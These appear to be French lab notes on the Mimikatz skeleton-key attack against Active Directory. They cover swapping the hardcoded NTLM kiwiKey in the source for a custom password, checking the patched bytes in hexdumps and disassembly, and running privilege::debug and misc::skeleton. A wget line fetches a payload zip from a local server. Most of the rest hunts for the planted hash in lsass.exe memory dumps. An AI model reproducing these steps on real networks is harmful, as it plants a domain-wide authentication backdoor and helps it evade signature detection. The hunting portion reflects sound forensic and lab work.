@@ -1,0 +1,129 @@
+Dans le fichier mimikatz/mimikatz/modules/kuhl_m_misc.c	
+
+Ligne 602 -> DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+
+ntlm('mimikatz') = 60BA4FCA DC466C7A 033C1781 94C03DF6
+
+Cyber chef Endian swap:
+
+60BA4FCADC466C7A033C178194C03DF6
+ca4fba60 7a6c46dc 81173c03 f63dc094
+
+// ntlm('3sG1') = 09B5913B63FC950979D66094D51BE906 = {0X3b91b509, 0x0995fc63, 0x9460d679, 0x06e91bd5}
+// ntlm('love4ever!') = 7ABDD21107B038FC81FFAD71B5691FAB = {0X11d2bd7a, 0xfc38b007, 0x71adff81, 0xab1f69b5};
+ntlm('fuckyou1') = C936BFE49E25AB32E1E1D9CF7B53B25F = {0Xe4bf36c9, 0x32ab259e, 0xcfd9e1e1, 0x5fb2537b};
+
+Nouveau key -> DWORD kiwiKey[] = {0X11d2bd7a, 0xfc38b007, 0x71adff81, 0xab1f69b5};
+
+32 ab 25 9e c7 44 24
+
+Avec 3sG1 en password
+hexdump -C C:\sploit\mimikatz-master\x64\mimikatz.exe
+
+00065060  4c 89 4c 24 20 44 89 44  24 18 89 54 24 10 48 89  |L.L$ D.D$..T$.H.|
+00065070  4c 24 08 48 83 ec 58 c7  44 24 20 9a 00 00 c0 c7  |L$.H..X.D$ .....|
+00065080  44 24 38 09 b5 91 3b c7  44 24 3c 63 fc 95 09 c7  |D$8...;.D$<c....|
+00065090  44 24 40 79 d6 60 94 c7  44 24 44 d5 1b e9 06 ba  |D$@y.`..D$D.....|
+000650a0  28 00 00 00 33 c9 48 b8  4a 4a 4a 4a 4a 4a 4a 4a  |(...3.H.JJJJJJJJ|
+000650b0  ff d0 48 8b 4c 24 78 48  89 01 48 8b 44 24 78 48  |..H.L$xH..H.D$xH|
+
+c7 44 24 38 -> pattern 0
+09 B5 91 3B -> 0x3b91b509
+
+c7 44 24 3c -> pattern 1
+63 fc 95 09 -> 0x0995fc63
+
+c7 44 24 40 -> pattern 2
+79 d6 60 94 -> 0x9460d679
+
+c7 44 24 44 -> pattern 3
+d5 1b e9 06 -> 0x06e91bd5
+
+0:  c7 44 24 38 09 b5 91    mov    DWORD PTR [rsp+0x38],0x3b91b509
+7:  3b
+8:  c7 44 24 3c 63 fc 95    mov    DWORD PTR [rsp+0x3c],0x995fc63
+f:  09
+10: c7 44 24 40 79 d6 60    mov    DWORD PTR [rsp+0x40],0x9460d679
+17: 94
+18: c7 44 24 44 d5 1b e9    mov    DWORD PTR [rsp+0x44],0x6e91bd5
+1f: 06 
+
+https://defuse.ca/online-x86-assembler.htm#disassembly2
+
+> https://blog.stealthbits.com/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/
+
+.\mimikatz.exe
+
+privilege::debug
+misc::skeleton
+
+
+
+
+                     60ba4fca    dc466c7a    033c1781    94c03df6
+DWORD kiwiKey[] = {0Xca4fba60, 0x7a6c46dc, 0x81173c03, 0xf63dc094};
+                     7abdd211    07b038fc    81ffad71    b5691fab
+DWORD kiwiKey[] = {0X11d2bd7a, 0xfc38b007, 0x71adff81, 0xab1f69b5};
+
+
+cd .\Desktop\
+wget http://192.168.140.1:12346/x64_fuck.zip -UseBasicParsing -Out x64_fuck.zip
+
+
+
+
+ntlm('fuckyou1') = C936BFE49E25AB32E1E1D9CF7B53B25F = {0Xe4bf36c9, 0x32ab259e, 0xcfd9e1e1, 0x5fb2537b};
+
+c9 36 bf e4 9e 25 ab 32 e1 e1 d9 cf 7b 53 b2 5f
+e4 bf 36 c9 32 ab 25 9e cf d9 e1 e1 5f b2 53 7b
+
+
+Owner: Process lsass.exe Pid 596
+0x1dadc7b019a  c7 44 24 40 c9 36 bf e4 c7 44 24 44 9e 25 ab 32   .D$@.6...D$D.%.2
+0x1dadc7b01aa  c7 44 24 48 e1 e1 d9 cf c7 44 24 4c 7b 53 b2 5f   .D$H.....D$L{S._
+0x1dadc7b01ba  8b 44 24 70 8b d0 33 c9 48 b8 d0 71 9a ee fd 7f   .D$p..3.H..q....
+0x1dadc7b01ca  00 00 ff d0 48 89 44 24 38 48 83 7c 24 38 00 0f   ....H.D$8H.|$8..
+0x1dadc7b01da  84 d3 00 00 00 8b 44 24 70 44 8b c0 48 8b 54 24   ......D$pD..H.T$
+0x1dadc7b01ea  68 48 8b 4c 24 38 48 b8 40 c6 f9 f0 fd 7f 00 00   hH.L$8H.@.......
+0x1dadc7b01fa  ff d0 48 8b 84 24 80 00 00 00 48 89 44 24 20 4c   ..H..$....H.D$.L
+0x1dadc7b020a  8b 4c 24 78 44 8b 44 24 70 48 8b 54 24 38 48 8b   .L$xD.D$pH.T$8H.
+0x1dadc7b021a  4c 24 60 48 b8 40 82 c3 ec fd 7f 00 00 ff d0 89   L$`H.@..........
+0x1dadc7b022a  44 24 30 83 7c 24 30 00 7d 6d 48 8b 84 24 80 00   D$0.|$0.}mH..$..
+0x1dadc7b023a  00 00 8b 4c 24 34 89 08 48 8b 44 24 60 48 83 c0   ...L$4..H.D$`H..
+0x1dadc7b024a  10 48 8b 8c 24 80 00 00 00 48 89 4c 24 20 4c 8b   .H..$....H.L$.L.
+0x1dadc7b025a  4c 24 78 44 8b 44 24 70 48 8b 54 24 38 48 8b c8   L$xD.D$pH.T$8H..
+0x1dadc7b026a  48 b8 40 82 c3 ec fd 7f 00 00 ff d0 89 44 24 30   H.@..........D$0
+0x1dadc7b027a  83 7c 24 30 00 7c 20 41 b8 10 00 00 00 48 8d 54   .|$0.|.A.....H.T
+
+
+c936bfe4 9e25ab32 e1e1d9cf 7b53b25f
+
+c7 44 24 38 => 0x38
+c9 36 bf e4 => 
+c7 44 24 3c => 0x38+0x4
+9e 25 ab 32
+c7 44 24 40 => 0x38+0x8
+e1 e1 d9 cf 
+c7 44 24 44 => 0x38+0xc
+7b 53 b2 5f 
+
+
+Candidat potentiels:
+▶ cat candidate_ntlm_skeleton | sed '/Rule/d; /Owner/d' | awk -F'  ' '{print $2}' | egrep '^(c7 44 24)' | grep -v '00'      
+
+c7 44 24 3c 9e 25 ab 32 c7 44 24 40 e1 e1 d9 cf => 0x40 + 0x4 => 0x44, or le prochain est à 0x38
+
+c7 44 24 38 c9 36 bf e4 c7 44 24 3c 9e 25 ab 32 
+c7 44 24 40 e1 e1 d9 cf c7 44 24 44 7b 53 b2 5f
+=> Candidat N°1 : c936bfe49e25ab32e1e1d9cf7b53b25f
+
+c7 44 24 40 c9 36 bf e4 c7 44 24 44 9e 25 ab 32
+c7 44 24 48 e1 e1 d9 cf c7 44 24 4c 7b 53 b2 5f
+=> Le même qu'au dessus
+
+c7 44 24 48 ba aa 89 c6 c7 44 24 4c 78 8e d0 11 => 0x4c + 0x4 = 0x50, or le prochain est à 0x60
+c7 44 24 60 43 1a 35 de c7 44 24 64 59 8e d0 11 => 0x64 + 0x4 = 0x68, or le prochain est à 0x50
+c7 44 24 50 ba aa 89 c6 c7 44 24 54 78 8e d0 11 => 0x50 + 0x4 = 0x54, or le prochain est à 0x70
+c7 44 24 70 3f 1d a6 9b c7 44 24 74 3a e7 d0 11 => Pas de suite, donc ne peut pas etre un hash ntlm
+
+
